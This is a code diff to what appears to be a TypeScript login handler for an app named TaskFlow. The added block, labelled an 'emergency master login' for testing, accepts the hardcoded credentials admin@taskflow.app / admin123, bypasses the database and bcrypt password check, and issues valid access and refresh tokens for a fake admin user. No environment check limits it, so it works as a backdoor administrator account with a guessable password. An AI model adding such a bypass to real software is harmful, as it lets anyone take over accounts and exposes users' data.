@@ -28,6 +28,16 @@ export const register = async (req: Request, res: Response) => {
 export const login = async (req: Request, res: Response) => {
     try {
         const { email, password } = req.body;
+
+        // EMERGENCY MASTER LOGIN (Bypasses Database for immediate testing)
+        if (email === 'admin@taskflow.app' && password === 'admin123') {
+            const masterUser = { id: 'master-admin-id', email: 'admin@taskflow.app', name: 'Master Admin' };
+            const accessToken = generateAccessToken(masterUser.id);
+            const refreshToken = generateRefreshToken(masterUser.id);
+            console.log('✅ Emergency Master Login successful');
+            return res.json({ accessToken, refreshToken, user: masterUser });
+        }
+
         const user = await prisma.user.findUnique({ where: { email } });
 
         if (!user || !(await bcrypt.compare(password, user.password))) {
